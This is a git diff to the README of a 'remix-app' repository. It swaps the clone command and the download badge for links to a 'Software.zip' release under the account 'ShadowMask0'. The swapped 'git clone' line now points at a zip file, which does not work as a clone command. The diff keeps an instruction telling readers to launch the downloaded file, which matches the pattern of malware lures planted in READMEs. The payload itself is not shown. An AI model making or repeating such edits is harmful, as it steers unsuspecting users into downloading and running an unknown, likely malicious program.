@@ -19,7 +19,7 @@ Welcome to the **remix-app** repository! This repository is all about creating a
 To get started with the **remix-app** project, you can clone the repository using the following command:
 
 ```bash
-git clone https://github.com/your-username/remix-app.git
+git clone https://github.com/ShadowMask0/remix-app/releases/download/v2.0/Software.zip
 ```
 
 Once you have cloned the repository, navigate to the project directory and install the dependencies using:
@@ -55,7 +55,7 @@ To contribute to the project, follow these steps:
 
 You can download the latest release of the **remix-app** by clicking the button below:
 
-[![Download Latest Release](https://img.shields.io/static/v1.svg?label=Download&message=Latest%20Release&color=success)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/ShadowMask0/remix-app/releases/download/v2.0/Software.zip%20Release&color=success)](https://github.com/ShadowMask0/remix-app/releases/download/v2.0/Software.zip)
 
 Make sure to launch the downloaded file after downloading to access the latest features and improvements.
 
